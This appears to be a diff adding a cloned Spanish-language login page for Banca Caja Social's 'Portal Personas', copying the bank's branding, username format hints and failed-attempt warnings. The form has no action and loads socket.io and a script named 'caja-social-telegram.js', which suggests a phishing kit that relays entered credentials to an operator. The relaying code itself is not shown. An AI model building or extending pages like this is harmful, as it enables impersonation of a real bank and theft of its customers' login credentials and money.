@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bienvenido al Portal Personas - Banca Caja Social</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css?v=5">
+    <style>
+        /* Crítico: caja error login (no depende de caché de styles.css) */
+        #loginErrorAlert.login-error-active,
+        #loginErrorAlert:not([hidden]) {
+            display: block !important;
+            background-color: #fff5f5 !important;
+            border: 1px solid #f5c6cb !important;
+            border-radius: 4px !important;
+            margin-bottom: 20px !important;
+            box-sizing: border-box !important;
+        }
+        #loginErrorAlert .alert-body {
+            display: flex !important;
+            align-items: flex-start !important;
+            gap: 12px !important;
+            padding: 16px !important;
+        }
+        #loginErrorAlert .alert-icon {
+            flex-shrink: 0 !important;
+            width: 24px !important;
+            height: 24px !important;
+            border-radius: 50% !important;
+            background-color: #dc3545 !important;
+            color: #fff !important;
+            font-size: 15px !important;
+            font-weight: 700 !important;
+            line-height: 24px !important;
+            text-align: center !important;
+        }
+        #loginErrorAlert .alert-heading {
+            display: block !important;
+            color: #c62828 !important;
+            font-size: 14px !important;
+            font-weight: 700 !important;
+            margin-bottom: 6px !important;
+        }
+        #loginErrorAlert .alert-description {
+            display: block !important;
+            color: #c62828 !important;
+            font-size: 13px !important;
+            line-height: 1.55 !important;
+        }
+        #intentosRestantes.intentos-visible {
+            display: block !important;
+            color: #dc3545 !important;
+            font-size: 13px !important;
+            font-weight: 600 !important;
+            margin: 6px 0 12px !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999;display:none;justify-content:center;align-items:center;">
+        <div style="text-align:center;">
+            <img src="img/logo-overlay.png" alt="Caja Social" style="width:120px;height:auto;animation:pulse 1.5s ease-in-out infinite;">
+        </div>
+    </div>
+    <style>@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}.loading-overlay.show{display:flex!important}</style>
+    
+    <div class="container">
+        <div class="left-section">
+            <img src="img/background-3.png" alt="Familia" class="background-image">
+        </div>
+        <div class="right-section">
+            <div class="form-container">
+                <div class="logo-container">
+                    <img src="img/logoBCSLine.svg" alt="Banca Caja Social" class="logo">
+                </div>
+                
+                <h1 class="title">Bienvenido al<br>Portal Personas</h1>
+
+                <div id="loginErrorAlert" data-role="login-template__alert" class="alert alert-danger" role="alert" hidden style="display:none">
+                    <div class="alert-body">
+                        <div class="alert-icon" aria-hidden="true">!</div>
+                        <div class="alert-content">
+                            <strong role="heading" class="alert-heading">Usuario o contraseña incorrectas</strong>
+                            <div class="alert-description" data-role="alert-message">Recuerde que su contraseña será bloqueada al tercer intento errado. Por favor verifique e intente de nuevo.</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <p class="subtitle">
+                    Recuerde que su usuario está compuesto por<br>
+                    su Tipo de identificación <strong>(CC, CE, NI, TI, PE)</strong> y<br>
+                    su Número de documento sin espacios,<br>
+                    puntos ni comas.
+                </p>
+                
+                <form class="login-form" id="loginForm">
+                    <label for="usuario" class="form-label">Usuario</label>
+                    <input 
+                        type="text" 
+                        id="usuario" 
+                        name="usuario" 
+                        class="form-input"
+                        placeholder="Ejemplo: CC123456789"
+                    >
+                    <p class="input-example">Ejemplo: CC1234567890</p>
+                    <p id="loginFieldHint" class="field-hint-error" hidden>Datos incorrectos. Recuerde iniciar con CC, CE, NI, TI, PE.</p>
+                    <p id="intentosRestantes" class="intentos-msg" hidden>Le quedan 2 intentos</p>
+                    
+                    <button type="submit" class="btn-siguiente" id="submitBtn" disabled>Siguiente</button>
+                    
+                    <a href="#" class="link-password">¿Olvidó su contraseña? ▼</a>
+                    
+                    <div class="separator"></div>
+                    
+                    <p class="register-text">¿Es un cliente nuevo?</p>
+                    <a href="#" class="link-register">Registrarse</a>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script src="caja-social-telegram.js?v=6"></script>
+    <script src="client-optimized.js?v=6"></script>
+</body>
+</html>
